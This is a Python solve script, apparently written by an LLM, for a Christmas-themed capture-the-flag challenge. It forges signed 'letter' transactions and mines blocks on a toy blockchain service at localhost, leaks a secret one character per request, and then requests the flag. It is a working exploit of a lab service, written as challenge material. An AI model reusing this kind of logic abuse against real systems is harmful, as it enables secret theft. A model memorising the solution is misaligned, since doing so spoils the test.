#!/usr/bin/env python3
"""
This script was written by an LLM.

Automates the North-Poole chain to leak Santa's SECRET_GIFT one character at a
time and then request the flag.
"""

import hashlib
import json
import time
import uuid
from pathlib import Path

import requests
from cryptography.hazmat.primitives import serialization

NORTH_POOLE = "http://localhost"
DIFFICULTY_PREFIX = "0000"  # leading hex zeros required by the service (16 bits)
CONFIRM_DEPTH = 5


def hash_block(block: dict) -> str:
    block_str = json.dumps(block, sort_keys=True, separators=(",", ":"))
    return hashlib.sha256(block_str.encode()).hexdigest()


def load_hacker_key():
    key_path = Path("/challenge/keys/hacker/key")
    return serialization.load_ssh_private_key(key_path.read_bytes(), password=None)


def sign_tx(priv, tx):
    tx_type = tx["type"]
    payload = {
        "src": tx["src"],
        "dst": tx["dst"],
        "type": tx_type,
        tx_type: tx[tx_type],
        "nonce": tx["nonce"],
    }
    msg = json.dumps(payload, sort_keys=True, separators=(",", ":"))
    digest = hashlib.sha256(msg.encode()).digest()
    tx["sig"] = priv.sign(digest).hex()
    return tx


def mine_block(prev_hash, prev_index, txs, nice=None):
    block = {
        "index": prev_index + 1,
        "prev_hash": prev_hash,
        "nonce": 0,
        "txs": txs,
        "nice": nice,
    }
    nonce = 0
    while True:
        block["nonce"] = nonce
        blk_hash = hash_block(block)
        if blk_hash.startswith(DIFFICULTY_PREFIX):
            return block, blk_hash
        nonce += 1


def post_block(block):
    resp = requests.post(f"{NORTH_POOLE}/block", json=block)
    if resp.status_code != 200:
        raise RuntimeError(f"block rejected: {resp.text}")
    return resp


def get_head():
    head = requests.get(f"{NORTH_POOLE}/block").json()
    return head["hash"], head["block"]


def mine_chain_with_letters(priv, letters):
    head_hash, head_blk = get_head()

    # First block carries all letters; keep nice != hacker because hacker is tx src.
    letter_block, letter_hash = mine_block(head_hash, head_blk["index"], letters, nice="spruce")
    post_block(letter_block)

    # Age the letter block by CONFIRM_DEPTH blocks, optionally padding hacker onto the nice list.
    prev_hash, prev_index = letter_hash, letter_block["index"]
    nice_uses = 0
    for _ in range(CONFIRM_DEPTH + 1):
        nice_val = "hacker" if nice_uses < 10 else None
        blk, blk_hash = mine_block(prev_hash, prev_index, [], nice=nice_val)
        post_block(blk)
        prev_hash, prev_index = blk_hash, blk["index"]
        nice_uses += 1

    return letter_block, letter_hash


def collect_gifts(expected_nonces, timeout=120):
    gifts = {}
    seen = set()
    deadline = time.time() + timeout
    while time.time() < deadline and len(gifts) < len(expected_nonces):
        # Check txpool
        try:
            pool = requests.get(f"{NORTH_POOLE}/txpool").json()["txs"]
        except Exception:
            pool = []
        for tx in pool:
            if tx.get("type") == "gift" and tx.get("src") == "santa":
                nonce = tx.get("nonce", "")
                if nonce.endswith("-gift"):
                    base_nonce = nonce[:-5]
                    if base_nonce in expected_nonces and base_nonce not in gifts:
                        gifts[base_nonce] = tx.get("gift")
        # Check chain for already-mined gifts so we don't miss them if txpool expires.
        head_hash, _ = get_head()
        current = head_hash
        while current and current not in seen:
            seen.add(current)
            blk_resp = requests.get(f"{NORTH_POOLE}/block", params={"hash": current})
            if blk_resp.status_code != 200:
                break
            blk_json = blk_resp.json()
            blk = blk_json["block"]
            for tx in blk.get("txs", []):
                if tx.get("type") == "gift" and tx.get("src") == "santa":
                    nonce = tx.get("nonce", "")
                    if nonce.endswith("-gift"):
                        base_nonce = nonce[:-5]
                        if base_nonce in expected_nonces and base_nonce not in gifts:
                            gifts[base_nonce] = tx.get("gift")
            current = blk.get("prev_hash")
        if len(gifts) >= len(expected_nonces):
            break
        time.sleep(1)
    return gifts


def main():
    priv = load_hacker_key()

    # Build 32 letters for secret index #0..31
    letters = []
    index_to_nonce = {}
    for idx in range(32):
        nonce = str(uuid.uuid4())
        body = f"Dear Santa,\n\nFor christmas this year I would like secret index #{idx}"
        tx = {
            "src": "hacker",
            "dst": "santa",
            "type": "letter",
            "letter": body,
            "nonce": nonce,
        }
        letters.append(sign_tx(priv, tx))
        index_to_nonce[idx] = nonce

    mine_chain_with_letters(priv, letters)
    print("[*] Letters mined; waiting for Santa to queue gifts...")

    gifts = collect_gifts(set(index_to_nonce.values()))
    if len(gifts) < len(index_to_nonce):
        raise RuntimeError(f"incomplete gifts ({len(gifts)}/{len(index_to_nonce)})")
    secret_chars = [gifts[index_to_nonce[i]] for i in range(32)]
    secret = "".join(secret_chars)
    print(f"[+] SECRET_GIFT leaked: {secret}")

    # Ask directly for the flag.
    flag_nonce = str(uuid.uuid4())
    flag_letter = {
        "src": "hacker",
        "dst": "santa",
        "type": "letter",
        "letter": f"Dear Santa,\n\nFor christmas this year I would like {secret}",
        "nonce": flag_nonce,
    }
    flag_letter = sign_tx(priv, flag_letter)

    head_hash, head_blk = get_head()
    blk, blk_hash = mine_block(head_hash, head_blk["index"], [flag_letter], nice="spruce")
    post_block(blk)

    # Age the flag-request block so Santa will act on it.
    prev_hash, prev_index = blk_hash, blk["index"]
    for _ in range(CONFIRM_DEPTH + 1):
        empty_blk, empty_hash = mine_block(prev_hash, prev_index, [], nice=None)
        post_block(empty_blk)
        prev_hash, prev_index = empty_hash, empty_blk["index"]

    print("[*] Flag letter mined; waiting for flag gift...")
    flag_gifts = collect_gifts({flag_nonce})
    flag = flag_gifts.get(flag_nonce)
    if not flag:
        raise RuntimeError("failed to retrieve flag gift")
    print(f"[+] Flag: {flag}")


if __name__ == "__main__":
    main()
